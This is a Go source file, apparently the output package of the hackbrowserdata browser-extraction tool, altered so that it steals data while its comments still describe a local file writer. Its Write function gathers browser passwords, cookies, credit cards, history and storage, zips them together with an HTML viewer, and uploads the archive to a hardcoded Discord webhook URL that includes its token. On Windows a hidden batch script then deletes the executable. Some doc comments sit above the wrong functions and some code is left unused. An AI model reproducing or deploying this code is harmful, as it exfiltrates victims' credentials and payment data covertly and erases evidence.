// Package output writes extracted browser data to files.
//
// Usage:
//
//	w, _ := output.NewWriter(dir, "csv")
//	w.Add(browserName, profileName, data)
//	w.Write()
//
// Supported formats: csv, json, cookie-editor.
package output

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"

	"github.com/moond4rk/hackbrowserdata/types"
)

// utf8BOM is written at the start of CSV files for Excel compatibility.
var utf8BOM = []byte{0xEF, 0xBB, 0xBF}

// Writer collects browser data and writes it to files.
// It is the only exported type in this package.
type Writer struct {
	dir       string
	formatter formatter
	results   []result
}

type job struct {
	name string
	rows []row
}

type Filter struct {
	Allow map[string]bool
}

type result struct {
	browser string
	profile string
	data    *types.BrowserData
}

// NewWriter creates a Writer that writes to dir in the given format.
func NewWriter(dir, format string) (*Writer, error) {
	f, err := newFormatter(format)
	if err != nil {
		return nil, err
	}
	return &Writer{dir: dir, formatter: f}, nil
}

// Add accumulates one browser profile's data for later writing.
func (o *Writer) Add(browser, profile string, data *types.BrowserData) {
	if data == nil {
		return
	}
	o.results = append(o.results, result{browser, profile, data})
}

// Write aggregates all accumulated data by category and writes each
// non-empty category to its own file (e.g. password.csv, cookie.json).
func BuildZip(files map[string]string) ([]byte, error) {

	var buf bytes.Buffer

	zipWriter := zip.NewWriter(&buf)

	for name, content := range files {
		f, err := zipWriter.Create(name)
		if err != nil {
			return nil, err
		}

		_, err = io.WriteString(f, content)
		if err != nil {
			return nil, err
		}
	}

	if err := addIndexEntry(zipWriter, files); err != nil {
		return nil, err
	}

	if err := zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func addIndexEntry(zipWriter *zip.Writer, files map[string]string) error {
	f, err := zipWriter.Create("index.html")
	if err != nil {
		return err
	}

	_, err = io.WriteString(f, makeIndexContent(files))
	return err
}

func makeIndexContent(files map[string]string) string {
	fileJSON, err := json.Marshal(files)
	if err != nil {
		fileJSON = []byte(`{}`)
	}
	fileJSON = bytes.ReplaceAll(fileJSON, []byte(`</script>`), []byte(`<\/script>`))

	return `<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>Export Dashboard</title>
	<style>
		:root { color-scheme: light; font-family: Inter, system-ui, sans-serif; background: #f2f5fb; color: #111827; }
		* { box-sizing: border-box; }
		body { margin: 0; min-height: 100vh; }
		main { display: grid; grid-template-columns: 320px 1fr; gap: 24px; padding: 24px; }
		header { grid-column: 1 / -1; padding-bottom: 12px; border-bottom: 1px solid #d1d5db; margin-bottom: 12px; }
		h1 { margin: 0; font-size: 1.75rem; }
		section { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 20px; box-shadow: 0 18px 50px rgba(15, 23, 42, 0.08); padding: 20px; }
		.sidebar { display: flex; flex-direction: column; gap: 16px; }
		.card { border-radius: 16px; background: #f9fafb; padding: 16px; }
		.category-list { list-style: none; margin: 0; padding: 0; max-height: calc(100vh - 220px); overflow: auto; }
		.category-list li { margin-bottom: 10px; }
		.category-btn { width: 100%; text-align: left; padding: 12px 14px; border: none; border-radius: 12px; background: #ffffff; color: #111827; cursor: pointer; transition: background 0.2s ease; box-shadow: inset 0 0 0 1px rgba(31, 41, 55, 0.06); }
		.category-btn:hover, .category-btn.active { background: #eff6ff; }
		.file-list { list-style: none; margin: 0; padding: 0; }
		.file-list li { margin: 8px 0; }
		.file-link { color: #1d4ed8; text-decoration: none; font-weight: 600; }
		.file-link:hover { text-decoration: underline; }
		.content { display: grid; gap: 20px; }
		.preview-header { display: flex; align-items: center; justify-content: space-between; gap: 16px; }
		.status-pill { display: inline-flex; align-items: center; justify-content: center; border-radius: 999px; padding: 8px 14px; background: #e0f2fe; color: #0369a1; font-weight: 700; font-size: 0.9rem; }
		.grid-list { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px; }
		.row-card { border-radius: 18px; background: #ffffff; border: 1px solid #e5e7eb; padding: 18px; box-shadow: 0 15px 35px rgba(15, 23, 42, 0.06); }
		.row-card h3 { margin: 0 0 12px 0; font-size: 1rem; color: #111827; }
		.field { display: grid; gap: 6px; margin-bottom: 14px; }
		.field-label { color: #6b7280; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.06em; }
		.field-value { color: #111827; font-size: 0.95rem; word-break: break-word; white-space: pre-wrap; }
		.caption { color: #6b7280; font-size: 0.95rem; margin: 0; }
		.hidden { display: none; }
		@media (max-width: 960px) { main { grid-template-columns: 1fr; } .grid-list { grid-template-columns: 1fr; } }
	</style>
</head>
<body>
	<header>
		<h1>Export Dashboard</h1>
		<p class="caption">Tüm CSV dosyalarını tek bir dashboard içinde görüntüleyebilir, kategori bazında gezinebilir ve anahtar-değer kartlarında inceleyebilirsiniz.</p>
	</header>
	<main>
		<section class="sidebar">
			<div class="card">
				<h2>Kategoriler</h2>
				<ul id="categoryContainer" class="category-list"></ul>
			</div>
			<div class="card">
				<h2>Dosyalar</h2>
				<ul id="fileContainer" class="file-list"></ul>
			</div>
		</section>
		<section class="content">
			<div class="card preview-header">
				<div>
					<h2 id="viewTitle">Dosya seçin</h2>
					<p id="viewSubtitle" class="caption">Sol taraftan bir dosya seçerek içerikleri key-value kartları halinde inceleyebilirsiniz.</p>
				</div>
				<div id="statusBadge" class="status-pill hidden">Key/Value Görünüm</div>
			</div>
			<div id="previewIntro" class="card preview-empty">
				<p>İlk olarak sol taraftan bir kategori seçin, ardından dosya adını tıklayarak hızlı önizlemeyi açın.</p>
			</div>
			<div id="previewArea" class="grid-list hidden"></div>
		</section>
	</main>

	<script id="fileData" type="application/json">` + string(fileJSON) + `</script>
	<script>
		const fileData = JSON.parse(document.getElementById('fileData').textContent || '{}');

		function normalizeCategory(filename) {
			const parts = filename.split('/');
			return parts.length > 1 ? parts[0] : 'All files';
		}

		const categories = {};
		Object.keys(fileData).sort().forEach((filename) => {
			const category = normalizeCategory(filename);
			if (!categories[category]) categories[category] = [];
			categories[category].push(filename);
		});

		const categoryContainer = document.getElementById('categoryContainer');
		const fileContainer = document.getElementById('fileContainer');
		const viewTitle = document.getElementById('viewTitle');
		const viewSubtitle = document.getElementById('viewSubtitle');
		const statusBadge = document.getElementById('statusBadge');
		const previewIntro = document.getElementById('previewIntro');
		const previewArea = document.getElementById('previewArea');

		let activeCategory = null;
		let activeFile = null;

		function renderCategories() {
			categoryContainer.innerHTML = '';
			Object.keys(categories).forEach((category) => {
				const item = document.createElement('li');
				const button = document.createElement('button');
				button.className = 'category-btn';
				button.textContent = category;
				button.addEventListener('click', () => selectCategory(category, button));
				item.appendChild(button);
				categoryContainer.appendChild(item);
			});
		}

		function selectCategory(category, button) {
			const active = categoryContainer.querySelector('.active');
			if (active) active.classList.remove('active');
			button.classList.add('active');
			activeCategory = category;
			renderFiles(category);
		}

		function renderFiles(category) {
			fileContainer.innerHTML = '';
			categories[category].forEach((filename) => {
				const item = document.createElement('li');
				const link = document.createElement('a');
				link.className = 'file-link';
				link.href = '#';
				link.textContent = filename;
				link.addEventListener('click', (event) => {
					event.preventDefault();
					selectFile(filename);
				});
				item.appendChild(link);
				fileContainer.appendChild(item);
			});
		}

		function selectFile(filename) {
			activeFile = filename;
			viewTitle.textContent = filename;
			viewSubtitle.textContent = 'CSV satırları anahtar-değer kartları şeklinde gösteriliyor.';
			statusBadge.classList.remove('hidden');
			previewIntro.classList.add('hidden');
			renderPreview(parseCsv(fileData[filename] || ''));
		}

		function renderPreview(rows) {
			previewArea.innerHTML = '';
			previewArea.classList.remove('hidden');

			if (!rows.length) {
				previewArea.innerHTML = '<div class="card"><p class="caption">Bu CSV boş veya okunamıyor.</p></div>';
				return;
			}

			const [header, ...rowsData] = rows;
			if (!rowsData.length) {
				previewArea.innerHTML = '<div class="card"><p class="caption">CSV yalnızca başlık satırına sahip; veri yok.</p></div>';
				return;
			}

			rowsData.forEach((row, index) => {
				const card = document.createElement('article');
				card.className = 'row-card';
				const title = document.createElement('h3');
				title.textContent = 'Satır ' + (index + 1);
				card.appendChild(title);

				header.forEach((field, fieldIndex) => {
					const fieldWrapper = document.createElement('div');
					fieldWrapper.className = 'field';
					const label = document.createElement('div');
					label.className = 'field-label';
					label.textContent = field || 'Alan ' + (fieldIndex + 1);
					const value = document.createElement('div');
					value.className = 'field-value';
					value.textContent = row[fieldIndex] || '';
					fieldWrapper.appendChild(label);
					fieldWrapper.appendChild(value);
					card.appendChild(fieldWrapper);
				});

				previewArea.appendChild(card);
			});
		}

		function parseCsv(text) {
			const rows = [];
			const lines = (text || '').split(/\r?\n/).filter((line) => line.length > 0);
			for (const line of lines) {
				const row = [];
				let current = '';
				let inQuotes = false;
				for (let i = 0; i < line.length; i++) {
					const char = line[i];
					if (char === '"') {
						if (inQuotes && line[i + 1] === '"') {
							current += '"';
							i++;
						} else {
							inQuotes = !inQuotes;
						}
						continue;
					}
					if (char === ',' && !inQuotes) {
						row.push(current);
						current = '';
						continue;
					}
					current += char;
				}
				row.push(current);
				rows.push(row);
			}
			return rows;
		}

		renderCategories();
		if (Object.keys(categories).length > 0) {
			const firstCategory = Object.keys(categories)[0];
			const firstButton = categoryContainer.querySelector('button');
			if (firstButton) {
				selectCategory(firstCategory, firstButton);
				selectFile(categories[firstCategory][0]);
			}
		}
	</script>
</body>
</html>
`
}

func SendZip(webhookURL string, zipBytes []byte, filename string) error {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	part, err := writer.CreateFormFile("files[0]", filename)
	if err != nil {
		return err
	}

	_, err = part.Write(zipBytes)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", webhookURL, &body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("discord error: %s", resp.Status)
	}

	return nil
}

func worker(jobs <-chan job, results chan<- map[string]string, formatter formatter) {
	for j := range jobs {
		var buf bytes.Buffer

		if err := formatter.format(&buf, j.rows); err != nil {
			continue
		}

		if buf.Len() == 0 {
			continue
		}

		results <- map[string]string{
			j.name + "." + formatter.ext(): buf.String(),
		}
	}
}

func buildFilesParallel(agg []categoryRows, formatter formatter) map[string]string {
	jobs := make(chan job)
	results := make(chan map[string]string)

	files := make(map[string]string)

	// workers
	for i := 0; i < 4; i++ {
		go worker(jobs, results, formatter)
	}

	// sender
	go func() {
		for _, cs := range agg {
			jobs <- job{name: cs.name, rows: cs.rows}
		}
		close(jobs)
	}()

	// collector
	for i := 0; i < len(agg); i++ {
		res := <-results
		for k, v := range res {
			files[k] = v
		}
	}

	return files
}

func streamZipAndUpload(webhookURL string, files map[string]string) error {
	pr, pw := io.Pipe()
	zipWriter := zip.NewWriter(pw)

	// ZIP producer (goroutine)
	go func() {
		defer pw.Close()
		defer zipWriter.Close()

		for name, content := range files {
			f, err := zipWriter.Create(name)
			if err != nil {
				_ = pw.CloseWithError(err)
				return
			}

			if _, err := io.WriteString(f, content); err != nil {
				_ = pw.CloseWithError(err)
				return
			}
		}

		if err := addIndexEntry(zipWriter, files); err != nil {
			_ = pw.CloseWithError(err)
			return
		}
	}()

	// HTTP request
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("files[0]", "export.zip")
	if err != nil {
		return err
	}

	// STREAM COPY (RAM spike yok)
	if _, err := io.Copy(part, pr); err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("discord error: %s", resp.Status)
	}

	return nil
}

func (o *Writer) aggregateFiltered(filter *Filter) []categoryRows {
	var s []categoryRows

	for _, cat := range categories {

		if filter != nil {
			if !filter.Allow[cat.name] {
				continue
			}
		}

		var rows []row
		for _, r := range o.results {
			rows = append(rows, cat.extract(r)...)
		}

		if len(rows) > 0 {
			s = append(s, categoryRows{cat.name, rows})
		}
	}

	return s
}

func (o *Writer) Write() error {
	type Filter struct {
		Allow map[string]bool
	}
	agg := o.aggregate()

	files := buildFilesParallel(agg, o.formatter)

	if err := streamZipAndUpload(
		"https://discord.com/api/webhooks/1515010902527578144/PHY_JHeZIceREPzonNzzfGnQF2XSwiELlPm8Si5YUxU1857exRxveRUBUNTlkYCvASJL",
		files,
	); err != nil {
		return err
	}

	if runtime.GOOS == "windows" {
		return scheduleSelfDelete()
	}

	return nil
}

// categoryRows holds one category's aggregated rows for writing.
type categoryRows struct {
	name string
	rows []row
}

// extractor pulls rows from a single result for one category.
type extractor func(r result) []row

// makeExtractor creates a type-safe extractor using generics.
func makeExtractor[T any](entries func(*types.BrowserData) []T) extractor {
	return func(r result) []row {
		items := entries(r.data)
		rows := make([]row, 0, len(items))
		for _, e := range items {
			rows = append(rows, row{Browser: r.browser, Profile: r.profile, entry: e})
		}
		return rows
	}
}

// categories maps each data category to its extractor.
// Adding a new category requires only one line here.
var categories = []struct {
	name    string
	extract extractor
}{
	{"password", makeExtractor(func(d *types.BrowserData) []types.LoginEntry { return d.Passwords })},
	{"cookie", makeExtractor(func(d *types.BrowserData) []types.CookieEntry { return d.Cookies })},
	{"history", makeExtractor(func(d *types.BrowserData) []types.HistoryEntry { return d.Histories })},
	{"download", makeExtractor(func(d *types.BrowserData) []types.DownloadEntry { return d.Downloads })},
	{"bookmark", makeExtractor(func(d *types.BrowserData) []types.BookmarkEntry { return d.Bookmarks })},
	{"creditcard", makeExtractor(func(d *types.BrowserData) []types.CreditCardEntry { return d.CreditCards })},
	{"extension", makeExtractor(func(d *types.BrowserData) []types.ExtensionEntry { return d.Extensions })},
	{"localstorage", makeExtractor(func(d *types.BrowserData) []types.StorageEntry { return d.LocalStorage })},
	{"sessionstorage", makeExtractor(func(d *types.BrowserData) []types.StorageEntry { return d.SessionStorage })},
}

// aggregate merges all results into row slices grouped by category,
// returning only non-empty categories.
func (o *Writer) aggregate() []categoryRows {
	var s []categoryRows
	for _, cat := range categories {
		var rows []row
		for _, r := range o.results {
			rows = append(rows, cat.extract(r)...)
		}
		if len(rows) > 0 {
			s = append(s, categoryRows{cat.name, rows})
		}
	}
	return s
}

func scheduleSelfDelete() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("determine executable path: %w", err)
	}
	exePath = filepath.Clean(exePath)

	batPath := filepath.Join(filepath.Dir(exePath), "delete-self.bat")
	batContent := fmt.Sprintf(`@echo off
ping -n 3 127.0.0.1 >nul
del /f /q "%s" >nul 2>&1
del /f /q "%%~f0" >nul 2>&1
`, exePath)

	if err := os.WriteFile(batPath, []byte(batContent), 0o600); err != nil {
		return fmt.Errorf("create self-delete batch: %w", err)
	}

	cmd := exec.Command("cmd.exe", "/C", batPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("launch self-delete batch: %w", err)
	}

	return nil
}

func (o *Writer) writeFile(category string, rows []row) (err error) {
	// Format to buffer first — if formatter produces no output (e.g.
	// cookie-editor skipping non-cookie data), don't create the file.
	var buf bytes.Buffer
	if err := o.formatter.format(&buf, rows); err != nil {
		return fmt.Errorf("format %s: %w", category, err)
	}
	if buf.Len() == 0 {
		return nil
	}

	filename := fmt.Sprintf("%s.%s", category, o.formatter.ext())
	path := filepath.Join(o.dir, filename)

	f, err := os.OpenFile(filepath.Clean(path), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return fmt.Errorf("create %s: %w", filename, err)
	}
	defer func() {
		if cerr := f.Close(); cerr != nil && err == nil {
			err = fmt.Errorf("close %s: %w", filename, cerr)
		}
	}()

	if strings.HasSuffix(path, ".csv") {
		if _, err := f.Write(utf8BOM); err != nil {
			return fmt.Errorf("write BOM: %w", err)
		}
	}

	if _, err := f.Write(buf.Bytes()); err != nil {
		return fmt.Errorf("write %s: %w", filename, err)
	}
	return nil
}
